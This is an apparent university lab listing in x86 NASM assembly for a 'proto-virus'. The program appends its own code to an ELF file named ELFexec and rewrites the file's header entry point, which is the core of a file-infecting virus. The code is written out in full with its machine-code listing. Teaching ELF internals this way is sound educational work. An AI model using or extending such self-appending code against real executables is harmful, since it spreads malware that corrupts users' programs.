     1                                  %macro	syscall1 2
     2                                  	mov	ebx, %2
     3                                  	mov	eax, %1
     4                                  	int	0x80
     5                                  %endmacro
     6                                  
     7                                  %macro	syscall3 4
     8                                  	mov	edx, %4
     9                                  	mov	ecx, %3
    10                                  	mov	ebx, %2
    11                                  	mov	eax, %1
    12                                  	int	0x80
    13                                  %endmacro
    14                                  
    15                                  %macro  exit 1
    16                                  	syscall1 1, %1
    17                                  %endmacro
    18                                  
    19                                  %macro  write 3
    20                                  	syscall3 4, %1, %2, %3
    21                                  %endmacro
    22                                  
    23                                  %macro  read 3
    24                                  	syscall3 3, %1, %2, %3
    25                                  %endmacro
    26                                  
    27                                  %macro  open 3
    28                                  	syscall3 5, %1, %2, %3
    29                                  %endmacro
    30                                  
    31                                  %macro  lseek 3
    32                                  	syscall3 19, %1, %2, %3
    33                                  %endmacro
    34                                  
    35                                  %macro  close 1
    36                                  	syscall1 6, %1
    37                                  %endmacro
    38                                  
    39                                  %define STDOUT 1
    40                                  
    41                                  %define	STK_RES	200
    42                                  %define	RDWR	2
    43                                  %define	SEEK_END 2
    44                                  %define SEEK_SET 0
    45                                  
    46                                  %define ENTRY		24
    47                                  %define PHDR_start	28
    48                                  %define	PHDR_size	32
    49                                  %define PHDR_memsize	20	
    50                                  %define PHDR_filesize	16
    51                                  %define	PHDR_offset	4
    52                                  %define	PHDR_vaddr	8
    53                                  %define	PHDR_vaddr	8
    54                                  %define EHDR_size 52
    55                                  
    56                                  global _start
    57                                  
    58                                  	section .text
    59 00000000 55                      _start:	push	ebp
    60 00000001 89E5                    	mov	ebp, esp
    61 00000003 81ECC8000000            	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
    62                                  
    63                                  
    64                                  ; You code for this lab goes here
    65 00000009 E86C010000              call get_my_loc
    66 0000000E 83EB25                  sub ebx,next_i-OutStr
    67                                  write STDOUT,ebx,32
    67                              <1>  syscall3 4, %1, %2, %3
    67 00000011 BA20000000          <2>  mov edx, %4
    67 00000016 89D9                <2>  mov ecx, %3
    67 00000018 BB01000000          <2>  mov ebx, %2
    67 0000001D B804000000          <2>  mov eax, %1
    67 00000022 CD80                <2>  int 0x80
    68                                  open FileName,RDWR,0777;fd goes to eax
    68                              <1>  syscall3 5, %1, %2, %3
    68 00000024 BA09030000          <2>  mov edx, %4
    68 00000029 B902000000          <2>  mov ecx, %3
    68 0000002E BB[52010000]        <2>  mov ebx, %2
    68 00000033 B805000000          <2>  mov eax, %1
    68 00000038 CD80                <2>  int 0x80
    69 0000003A 890424                  mov [esp],eaX ;put fd in stack
    70 0000003D 833C2400                cmp dword[esp],0 ;check if open failed
    71 00000041 0F8CD8000000            jl Failed
    72                                  ;CheckELF
    73 00000047 8B0424                  mov eax,[esp];put fd in eax
    74 0000004A 83C404                  add esp,4;move position after fd in stack
    75                                  read eax,esp,4
    75                              <1>  syscall3 3, %1, %2, %3
    75 0000004D BA04000000          <2>  mov edx, %4
    75 00000052 89E1                <2>  mov ecx, %3
    75 00000054 89C3                <2>  mov ebx, %2
    75 00000056 B803000000          <2>  mov eax, %1
    75 0000005B CD80                <2>  int 0x80
    76 0000005D 83EC04                  sub esp,4;return to top of stack
    77 00000060 817C24047F454C46        cmp dword[esp+4], 0x464c457f ;magic number
    78 00000068 0F85B1000000            jne Failed
    79                                  ;write virus to end of file
    80 0000006E 8B0424                  mov eax,[esp]
    81                                  lseek eax,0,SEEK_END
    81                              <1>  syscall3 19, %1, %2, %3
    81 00000071 BA02000000          <2>  mov edx, %4
    81 00000076 B900000000          <2>  mov ecx, %3
    81 0000007B 89C3                <2>  mov ebx, %2
    81 0000007D B813000000          <2>  mov eax, %1
    81 00000082 CD80                <2>  int 0x80
    82 00000084 8B0424                  mov eax,[esp]
    83 00000087 B9[00000000]            mov ecx,_start
    84 0000008C BB[92010000]            mov ebx,virus_end;ebx will hold the size of start untill the end
    85 00000091 81EB[00000000]          sub ebx,_start
    86                                  write eax,ecx,ebx
    86                              <1>  syscall3 4, %1, %2, %3
    86 00000097 89DA                <2>  mov edx, %4
    86 00000099 89C9                <2>  mov ecx, %3
    86 0000009B 89C3                <2>  mov ebx, %2
    86 0000009D B804000000          <2>  mov eax, %1
    86 000000A2 CD80                <2>  int 0x80
    87                                  
    88                                  ;task1
    89 000000A4 8B1C24                  mov ebx,[esp];move fd to ebx
    90                                  lseek ebx,0,SEEK_SET;move to the beginning of the file
    90                              <1>  syscall3 19, %1, %2, %3
    90 000000A7 BA00000000          <2>  mov edx, %4
    90 000000AC B900000000          <2>  mov ecx, %3
    90 000000B1 89DB                <2>  mov ebx, %2
    90 000000B3 B813000000          <2>  mov eax, %1
    90 000000B8 CD80                <2>  int 0x80
    91 000000BA 8B1C24                  mov ebx,[esp];move fd to ebx
    92 000000BD 83C408                  add esp,8 ;move esp to point after magic numbers
    93                                  read ebx,esp,EHDR_size
    93                              <1>  syscall3 3, %1, %2, %3
    93 000000C0 BA34000000          <2>  mov edx, %4
    93 000000C5 89E1                <2>  mov ecx, %3
    93 000000C7 89DB                <2>  mov ebx, %2
    93 000000C9 B803000000          <2>  mov eax, %1
    93 000000CE CD80                <2>  int 0x80
    94 000000D0 83C418                  add esp,ENTRY;entry point of ELFexec in out local memory
    95 000000D3 C7042494820408          mov  dword[esp],0x08048294
    96 000000DA 83EC18                  sub esp,ENTRY;beginning of the elf header in our local memory
    97                                  lseek ebx,0,SEEK_SET;move to the beginning of the file
    97                              <1>  syscall3 19, %1, %2, %3
    97 000000DD BA00000000          <2>  mov edx, %4
    97 000000E2 B900000000          <2>  mov ecx, %3
    97 000000E7 89DB                <2>  mov ebx, %2
    97 000000E9 B813000000          <2>  mov eax, %1
    97 000000EE CD80                <2>  int 0x80
    98 000000F0 8B5C24F8                mov ebx,[esp-8]
    99                                  write ebx,esp,EHDR_size
    99                              <1>  syscall3 4, %1, %2, %3
    99 000000F4 BA34000000          <2>  mov edx, %4
    99 000000F9 89E1                <2>  mov ecx, %3
    99 000000FB 89DB                <2>  mov ebx, %2
    99 000000FD B804000000          <2>  mov eax, %1
    99 00000102 CD80                <2>  int 0x80
   100 00000104 83EC08                  sub esp,8
   101                                  
   102                                  
   103                                  VirusExit:
   104 00000107 8B0424                  	mov eax,[esp]
   105                                  	close eax
   105                              <1>  syscall1 6, %1
   105 0000010A 89C3                <2>  mov ebx, %2
   105 0000010C B806000000          <2>  mov eax, %1
   105 00000111 CD80                <2>  int 0x80
   106                                      exit 0            ; Termination if all is OK and no previous code to jump to
   106                              <1>  syscall1 1, %1
   106 00000113 BB00000000          <2>  mov ebx, %2
   106 00000118 B801000000          <2>  mov eax, %1
   106 0000011D CD80                <2>  int 0x80
   107                                                           ; (also an example for use of above macros)
   108                                  Failed:
   109 0000011F 8B0424                  	mov eax,[esp]
   110                                  	close eax
   110                              <1>  syscall1 6, %1
   110 00000122 89C3                <2>  mov ebx, %2
   110 00000124 B806000000          <2>  mov eax, %1
   110 00000129 CD80                <2>  int 0x80
   111                                  	write STDOUT,Failstr,13
   111                              <1>  syscall3 4, %1, %2, %3
   111 0000012B BA0D000000          <2>  mov edx, %4
   111 00000130 B9[81010000]        <2>  mov ecx, %3
   111 00000135 BB01000000          <2>  mov ebx, %2
   111 0000013A B804000000          <2>  mov eax, %1
   111 0000013F CD80                <2>  int 0x80
   112                                  	exit 1
   112                              <1>  syscall1 1, %1
   112 00000141 BB01000000          <2>  mov ebx, %2
   112 00000146 B801000000          <2>  mov eax, %1
   112 0000014B CD80                <2>  int 0x80
   113 0000014D 4646464600              addr: db "FFFF",0
   114 00000152 454C466578656300        FileName:	db "ELFexec", 0
   115 0000015A 546865206C61622039-     OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
   115 00000163 2070726F746F2D7669-
   115 0000016C 72757320737472696B-
   115 00000175 6573210A00         
   116                                  get_my_loc: 
   117 0000017A E800000000              	call next_i
   118                                  next_i:
   119 0000017F 5B                      	pop ebx
   120 00000180 C3                      	ret
   121 00000181 70657268617073206E-     Failstr:        db "perhaps not", 10 , 0
   121 0000018A 6F740A00           
   122 0000018E [07010000]              PreviousEntryPoint: dd VirusExit
   123                                  virus_end:
   124                                  
   125                                  
